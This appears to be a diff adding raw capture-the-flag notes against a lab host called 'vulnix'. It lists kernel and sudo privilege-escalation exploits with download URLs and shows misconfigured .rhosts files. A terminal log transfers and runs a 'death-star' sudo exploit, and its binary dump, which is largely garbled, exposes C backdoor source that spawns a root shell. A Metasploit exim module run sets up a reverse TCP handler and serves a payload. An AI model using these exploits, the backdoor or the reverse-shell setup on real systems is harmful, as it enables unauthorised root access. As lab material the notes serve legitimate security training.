+   Download URL: https://www.exploit-db.com/download/41458
+   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+
+[+] [CVE-2017-7308] af_packet
+
+   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
+   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
+   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
+
+[+] [CVE-2009-1185] udev
+
+   Details: https://www.exploit-db.com/exploits/8572/
+   Tags: ubuntu=8.10|9.04
+   Download URL: https://www.exploit-db.com/download/8572
+   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
+
+[+] [CVE-2009-1185] udev 2
+
+   Details: https://www.exploit-db.com/exploits/8478/
+   Download URL: https://www.exploit-db.com/download/8478
+   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
+
+[+] [CVE-2012-0809] death_star (sudo)
+
+   Details: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
+   Tags: fedora=16
+   Download URL: https://www.exploit-db.com/download/18436
+
+[+] [CVE-2014-5119] __gconv_translit_find
+
+   Details: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
+   Tags: debian=6
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz
+
+[+] [CVE-2015-3202] fuse (fusermount)
+
+   Details: http://seclists.org/oss-sec/2015/q2/520
+   Tags: debian=7.0|8.0,[ ubuntu=* ]
+   Download URL: https://www.exploit-db.com/download/37089
+   Comments: Needs cron or system admin interaction
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Tags: ubuntu=16.04|16.10,debian=7|8
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+
+[+] [CVE-2017-1000366,CVE-2017-1000370] linux_ldso_hwcap
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
+
+[+] [CVE-2017-1000366,CVE-2017-1000371] linux_ldso_dynamic
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root PIEs
+
+[+] [CVE-2017-1000370,CVE-2017-1000371] linux_offset2lib
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
+   Comments: Uses "Stack Clash" technique
+
+vulnix@vulnix:~$
+
+================================================================================================================================================================
+
+Solaris misconfigured .rhosts file-
+# pwd
+/home/chris
+
+# cat .rhosts
+chris        mail.xmm.com
++     192.168.0.10
+
+
+Linux misconfigured .rhosts file, allowing everything
+
+# pwd
+/home/root
+
+# cat .rhosts
++ +
+/root@Security-Audit-01:~/Desktop/CTFs/HackLab# cp /home/pentester/death-star.c ./
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# gcc death-star.c -o death-star
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ls -al
+total 76
+drwxr-xr-x  2 root      root       4096 Mar  5 03:00 .
+drwxr-xr-x 18 root      root       4096 Mar  2 22:03 ..
+-rwxr-xr-x  1 root      root      18416 Mar  5 03:00 death-star
+-rw-r--r--  1 root      root       7828 Mar  5 03:00 death-star.c
+-rwxr-xr-x  1 root      root      14656 Mar  3 02:21 libxoxo.so.1.0
+-rw-r--r--  1 root      root         15 Mar  2 23:22 pass.txt
+-rw-r--r--  1 pentester pentester   330 Mar  3 02:18 privesc-sudo.c
+-rw-r--r--  1 root      root       2120 Mar  3 02:20 privesc-sudo.o
+-rw-r--r--  1 root      root          7 Mar  2 23:07 users.lst
+-rw-r--r--  1 root      root          7 Mar  3 01:03 users.txt
+-rw-r--r--  1 root      root         10 Mar  2 23:22 user.txt
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# scp death-star user@192.168.1.37:/home/user/
+user@192.168.1.37's password: 
+death-star                                                                                                                                                              100%   18KB   9.8MB/s   00:00    
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ssh user@192.168.1.37
+user@192.168.1.37's password: 
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Thu Mar  5 02:01:24 GMT 2020
+
+  System load:  0.0              Processes:           89
+  Usage of /:   91.6% of 773MB   Users logged in:     0
+  Memory usage: 4%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.6% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Thu Mar  5 01:51:40 2020 from 192.168.1.8
+user@vulnix:~$ ls
+death-star  dirtycow  dirtycow2  dirtycow.c  LinEnum.sh  Linux-exploit-suggester.sh
+user@vulnix:~$ ./death-star 
+-bash: ./death-star: cannot execute binary file
+user@vulnix:~$ sh ./death-star 
+./death-star: 1: ./death-star: ELF: not found
+./death-star: 2: ./death-star: -: not found
+./death-star: 3: ./death-star: Syntax error: "(" unexpected
+user@vulnix:~$ chmod +x death-star 
+user@vulnix:~$ sh ./death-star 
+./death-star: 1: ./death-star: ELF: not found
+./death-star: 2: ./death-star: -: not found
+./death-star: 3: ./death-star: Syntax error: "(" unexpected
+user@vulnix:~$ cat death-star 
+ELF>?@p@@8
+          @@@@h???
+
+                -
+-
+   ???-?=?=???-?=?=????DDP?td?#?#?#llQ?tdR?td?-?=?=/lib64/ld-linux-x86-64.so.2GNUGNU?!I??jJYI??(0??@ĉ??ݣk?e?mŹ?@ *d???F?@kV? ]r|:4M
+                                                                                                                                   + ?/?!??!??"??libc.so.6exitfopenwait__isoc99_scanfputsforkpopenchmodfgetsmemsetunsetenvputenvmemcpyfcloseexecvesetrlimitgnu_get_libc_versionfwritesleep__cxa_finalizeunamestrcmp__libc_start_mainsnprintf__environGLIBC_2.7GLIBC_2.14GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon?????A@ @(@0@8@@@H@??TMCP@neTableii
+X@
+  `@
+    h@p@x@?@?@?@?@?@?@?@?@?@?@?H??/H??t??H???5?/?%?/@?%?/h??????%?/h??????%?/h??????%?/h?????%?/h?????%?/h?????%?/h?????%?/h?p????%?/?`????%?/h	?P????%?/h
+?@????%?/h
+          ?0????%?/h
+]??f.?]?ff.?H?=?/H?5?/UH)?H??H??H??H???H?H??tH??-H??t?%J/h?????%B/h?????%:/h?????%2/h?????%R.f?1?I??^H??H???PTL?H?
+                                                     ]??f?]?ff.??=Q/u/H?=w-UH??t
+??????H?E?????H?E?H?E?H?E?H?ƿ?{????&????E??}?y3??????????????????H?=?           H?=Z.?
+                                                                     ??????????K?}?u??????*H?E?H???????E܃???u??????????UH??SH???E??????E??W?E?Hc?H??H??H?H??H?9-H??????H??H????????u ????H??H?=:
+                                                                                                                                                                                                ???????E??{??}?~??E?H??[]?UH??H??p?E?????H?E?H?
+ H?
+   ?H?Ǹ????H?E?H?5?
+                   H???W???H?E?H?}?u?=?
+???,?@??,?E??T?E?Hc?H??H??H?H??H??+H?H??H?=?,?|?????uH?5?,H?=?????H?E?H??
+                                                              ???????E??E??}?~??E???UH??H??0?E?H??????H??
+                                                                                                         ?&H??H???H?H??H???
+H?RH?@f?
+H?RH?@H?5@
+          H?=<
+              ?I???H?E?H?}?uH?=/
+                                ?B????E??????H?5
+                                                H?=V
+                                                    ??A???H?U?H??????H?Ѻ5?H???1???H?E?H??????H??????d?H???,???H?????L?
+?                                                                                                                     H?
+H?
+  ?H?Ǹ?????H?5?
+H?=?
+?????H?????H?5
+H???`???H?E?H?}?uH?=?
+?i????E?????H?E?H???f???H?E??d?H??????H?E?L?z
+s?
+H??
+?+H?Ǹ?E???H?5?
+H?=?
+?????H?E?H?}?uH?=?	??????E??????H?5?
+H?=?
+??????H?U?H?E?H?Ѻc?H???????H?E?H????????H?={
+?`????E???UH??H????E?H?LD_PRELO?AD=H????H????H?? ??????H??????H?? ??????H???z???ƅ ??ƅ!??Fƅ"??ƅ#??@?E???E???H?H?? ??H? ????E??}?y?~?H????H??
+x       H??                                                                                                                                 H??H?? ?????H??H???Y???H??????(?H???????H?????H?
+?H?Ǹ????H????H???????H?????H??????????UH??H??`H?%20$08n H?%*482$ %H?E?H?U?H?*2850$ %H?10737418H?E?H?U??E?24$H?E?H?E?H?`
+H?E?H?Y
+H?E?H?Q
+H?E?H?E?H?i(H?E?H??H?=??6??????UH??H??H?=
+????H?=
+????H??H?E?H?E?H?(H?E?H??H?=?????????AWI??AVI??AUA??ATL?%$UH?-$SL)?H?????H??t?L??L??D??A??H??H9?u?H?[]A\A]A^A_??H?H??/usr/bin/sudo[+] Targeting release: %s
+[+] Press enter when ready...%c[-] An error occurred while forking sudo[+] Found vuln glibc version: %s
+%s -Vr[-] Failed to get sudo's version
+[-]Exiting..[+] Found a vuln sudo version: %s
+wbe.c[-] Failed to write backdoor on the target, check your permissions[+] Writing backdoor: %s
+e/usr/bin/gcc %s -o %s[+] Compiling backdoor: %s
+[-] Failed to compile the backdoor, check the gcc path#!/bin/sh
+chown root:root %s
+chmod 4777 %s
+we.sh[+] Writing SUDO_ASKPASS file: %s
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char **argv){
+    printf("[+] Getting root..!\n");
+    setresuid(0,0,0);
+    printf("[+] Cleaning system.\n");
+    remove("e"); remove("e.c"); remove("e.sh");
+    printf("[+] Launching root shell!\n");
+    system("/bin/sh");
+    exit(0);
+}
+SUDO_ASKPASS=%s-D9-ALD_PRELOADSUDO_ASKPASSl
+                                           p?????????????
+????C???????<????\????|(?????????????p???(zRx
+                                            p???+zRx
+                                                   $?????FJ
+                                                           ??;*3$"??\
+4??9A?C
+E?v????A?C
+? ????A?C
+*b???/A?C
+.q???3A?C
+?????A?C
+K ????PA?C
+DD(???]B?E?E ?E(?H0?H8?G@j8A0A(B BB?@????p
+$????@@
+E
+?@(?    ??????o????o???o????o?=6FVfv????????&6FVfv???@1.8.01.8.11.8.21.8.32.14.90GCC: (Debian 7.4.0-2) 7.4.0??@@?	
+?
+
+??$ ?# $?=?=?=??@?@?A??
+                       ? !p7?AF?=m?y?=???????%????=??=??=??#?@?
+                                                               	 v/( DAP% ?@Wi?Ap$??3???????#?@0D ?!?S?@`s ??]??C)?+??????A??9?? ??A`AP(??2EXnB?r?mP??????A? ?
+                                                                                                                                                              ":crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7026__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrydeath-star.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_finiwrite_backdoor_ITM_deregisterTMCloneTablevuln_sudo_versionsputs@@GLIBC_2.2.5_edatafclose@@GLIBC_2.2.5set_envsnprintf@@GLIBC_2.2.5uname@@GLIBC_2.2.5memset@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5fgets@@GLIBC_2.2.5execve@@GLIBC_2.2.5putenv@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handlememcpy@@GLIBC_2.14_IO_stdin_used__libc_csu_initis_glibc_vulnsetrlimit@@GLIBC_2.2.5__bss_startmaingnu_get_libc_version@@GLIBC_2.2.5chmod@@GLIBC_2.2.5s_versionvuln_glibc_versionsis_sudo_vulnkill_sudopopen@@GLIBC_2.2.5fopen@@GLIBC_2.2.5unsetenv@@GLIBC_2.2.5ver__isoc99_scanf@@GLIBC_2.7pop_shell__environ@@GLIBC_2.2.5exit@@GLIBC_2.2.5fwrite@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesleep@@GLIBC_2.2.5wait@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5fork@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment?#?? 1??$D??No
+                                @V@@E^???o??@k????B??  ?????$$	?  ??#?#l? $ $??????=?-?????@??@?0? ?A?1? ?0?1?1H	-       ;Ld?user@vulnix:~$ ^C
+user@vulnix:~$ exit
+logout
+Connection to 192.168.1.37 closed.
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ssh root@192.168.1.37
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Thu Mar  5 02:03:08 GMT 2020
+
+  System load:  0.0              Processes:           89
+  Usage of /:   91.6% of 773MB   Users logged in:     0
+  Memory usage: 4%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.6% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Tue Mar  3 03:02:02 2020 from 192.168.1.8
+root@vulnix:~# cp /home/user/death-star /tmp/
+root@vulnix:~# /tmp/death-star 
+-bash: /tmp/death-star: cannot execute binary file
+root@vulnix:~# cd /tmp/
+root@vulnix:/tmp# ls -al
+total 28
+drwxrwxrwt  2 root root  4096 Mar  5 02:03 .
+drwxr-xr-x 22 root root  4096 Sep  2  2012 ..
+-rwxr-xr-x  1 root root 18416 Mar  5 02:03 death-star
+root@vulnix:/tmp# ./death-star 
+-bash: ./death-star: cannot execute binary file
+root@vulnix:/tmp# sh ./death-star 
+./death-star: 1: ./death-star: ELF: not found
+./death-star: 2: ./death-star: -: not found
+./death-star: 3: ./death-star: Syntax error: "(" unexpected
+root@vulnix:/tmp# cp /home/user/dirtycow /tmp/
+root@vulnix:/tmp# ./dirtycow 
+-bash: ./dirtycow: cannot execute binary file
+root@vulnix:/tmp# sh ./dirtycow 
+./dirtycow: 1: ./dirtycow: Syntax error: "(" unexpected
+root@vulnix:/tmp# bash death-star 
+death-star: death-star: cannot execute binary file
+
+
+================================================================================================================================================================
+       =[ metasploit v5.0.3-dev                           ]
++ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/linux/smtp/exim4_dovecot_exec
+msf5 exploit(linux/smtp/exim4_dovecot_exec) > options
+
+Module options (exploit/linux/smtp/exim4_dovecot_exec):
+
+   Name        Current Setting          Required  Description
+   ----        ---------------          --------  -----------
+   DOWNFILE                             no        Filename to download, (default: random)
+   DOWNHOST                             no        An alternative host to request the MIPS payload from
+   EHLO        debian.localdomain       yes       TO address of the e-mail
+   HTTP_DELAY  60                       yes       Time that the HTTP Server will wait for the ELF payload request
+   MAILTO      root@debian.localdomain  yes       TO address of the e-mail
+   RHOSTS                               yes       The target address range or CIDR identifier
+   RPORT       25                       yes       The target port (TCP)
+   SRVHOST     0.0.0.0                  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     80                       yes       The daemon port to listen on
+   SSL         false                    no        Negotiate SSL for incoming connections
+   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                              no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf5 exploit(linux/smtp/exim4_dovecot_exec) > set RHOSTS 192.168.1.37
+RHOSTS => 192.168.1.37
+
+msf5 exploit(linux/smtp/exim4_dovecot_exec) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.1.8:4444 
+[*] 192.168.1.37:25 - 192.168.1.37:25 - Starting up our web service on http://192.168.1.8:80/VTgexATMhOZkPg ...
+[*] 192.168.1.37:25 - Using URL: http://0.0.0.0:80/VTgexATMhOZkPg
+[*] 192.168.1.37:25 - Local IP: http://192.168.1.8:80/VTgexATMhOZkPg
+
+msf5 exploit(linux/smtp/exim4_dovecot_exec) > [*] 192.168.1.37:25 - 192.168.1.37:25 - Server: 220 vulnix ESMTP Postfix (Ubuntu)
+[-] 192.168.1.37:25 - Exploit aborted due to failure: no-target: 192.168.1.37:25 - The target server is not running Exim!
+[*] 192.168.1.37:25 - Server stopped.
+
